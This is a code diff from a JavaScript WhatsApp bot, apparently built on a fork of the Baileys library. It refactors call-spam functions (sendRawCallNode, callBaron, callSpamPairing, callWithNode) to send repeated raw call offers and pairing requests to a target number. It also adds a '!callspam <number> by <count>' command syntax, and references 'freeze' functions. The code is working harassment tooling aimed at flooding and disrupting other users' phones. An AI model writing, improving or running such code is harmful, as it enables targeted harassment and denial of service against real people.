@@ -114,24 +114,24 @@ const wireSize = (msg) => {
 }
 
 // manual call offer via a raw 'call' node
-async function sendRawCallNode(target) {
-  const devices = await sock
+async function sendRawCallNode(conn, target) {
+  const devices = await conn
     .getUSyncDevices([target], false, false)
     .then((ds) => ds.map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`))
-  await sock.assertSessions(devices)
-  const { nodes: destinations } = await sock.createParticipantNodes(
+  await conn.assertSessions(devices)
+  const { nodes: destinations } = await conn.createParticipantNodes(
     devices,
     { conversation: 'y' },
     { count: '0' }
   )
   const callNode = {
     tag: 'call',
-    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
+    attrs: { to: target, id: conn.generateMessageTag(), from: conn.user.id },
     content: [{
       tag: 'offer',
       attrs: {
         'call-id': crypto.randomBytes(16).toString('hex').toUpperCase(),
-        'call-creator': sock.user.id,
+        'call-creator': conn.user.id,
       },
       content: [
         { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
@@ -144,18 +144,14 @@ async function sendRawCallNode(target) {
       ],
     }],
   }
-  await sock.sendNode(callNode)
+  await conn.sendNode(callNode)
 }
 
-// one call offer via native offerCall, falling back to the raw node builder
-async function sendCallOffer(target, count = 1) {
+// send one or more call offers via a raw 'call' node (no offerCall dependency)
+async function sendCallOffer(conn, target, count = 1) {
   const offers = Math.max(1, count)
   for (let i = 0; i < offers; i++) {
-    if (typeof sock.offerCall === 'function') {
-      await sock.offerCall(target, { isVideo: false })
-    } else {
-      await sendRawCallNode(target)
-    }
+    await sendRawCallNode(conn, target)
     if (i < offers - 1) await sleep(1500)
   }
   return offers
@@ -520,10 +516,10 @@ async function FrezeXblank(target, opts = {}) {
 }
 
 // callWithNode (1).js -> callWithNode (raw node call spam, 5s spacing)
-async function callWithNode(target, opts = {}) {
+async function callWithNode(conn, target, opts = {}) {
   const loops = opts.count ?? 1
   for (let i = 0; i < loops; i++) {
-    await sendRawCallNode(target)
+    await sendRawCallNode(conn, target)
     await sleep(5000)
   }
   return loops
@@ -1211,23 +1207,20 @@ async function freeze(target) {
 }
 
 // CallBaron.js / CallSpam.js / CallSpamPairingSpam.js -> call spam variants
-async function callBaron(target, count = 1, isVideo = false) {
+async function callBaron(conn, target, count = 1, isVideo = false) {
   for (let i = 0; i < count; i++) {
-    if (typeof sock.offerCall === 'function') await sock.offerCall(target, isVideo).catch(() => {})
-    else await sendRawCallNode(target)
+    await sendRawCallNode(conn, target)
     await new Promise((r) => setImmediate(r))
   }
   return count
 }
 
-async function callSpamPairing(target, count = 5) {
+async function callSpamPairing(conn, target, count = 5) {
   const { fetchLatestBaileysVersion, useMultiFileAuthState: mfa, makeWASocket: mws } = await import('@lordmega/baileys')
   const bare = target.replace(/@[\w.-]+$/, '')
   for (let i = 0; i < count; i++) {
     try {
-      if (typeof sock.offerCallChat === 'function') await sock.offerCallChat(target)
-      else if (typeof sock.offerCall === 'function') await sock.offerCall(target, false)
-      else await sendRawCallNode(target)
+      await sendRawCallNode(conn, target)
       await sleep(1000)
       try {
         const { state } = await mfa('./database/Spam')
@@ -1668,7 +1661,7 @@ const commands = {
         await conn.sendMessage(from, { text: `[!calltest] invalid target: ${args[0]}` })
         return
       }
-      const sent = await sendCallOffer(target, 1)
+      const sent = await sendCallOffer(conn, target, 1)
       await conn.sendMessage(from, { text: `[!calltest] sent ${sent} call offer(s) to ${target}` })
     },
     aliases: ['ct'],
@@ -1682,8 +1675,12 @@ const commands = {
         await conn.sendMessage(from, { text: `[!callspam] invalid target: ${args[0]}` })
         return
       }
-      const count = parseInt(args[1] || '1', 10)
-      const sent = await sendCallOffer(target, count)
+      // Count is written as "by <count>" (e.g. !callspam 2348012345678 by 20)
+      const byIdx = args.findIndex((a) => /^by$/i.test(a))
+      const count = byIdx >= 0 && /^\d+$/.test(args[byIdx + 1] || '')
+        ? parseInt(args[byIdx + 1], 10)
+        : 1
+      const sent = await sendCallOffer(conn, target, count)
       await conn.sendMessage(from, { text: `[!callspam] sent ${sent} call offer(s) to ${target}` })
     },
     aliases: ['cs'],
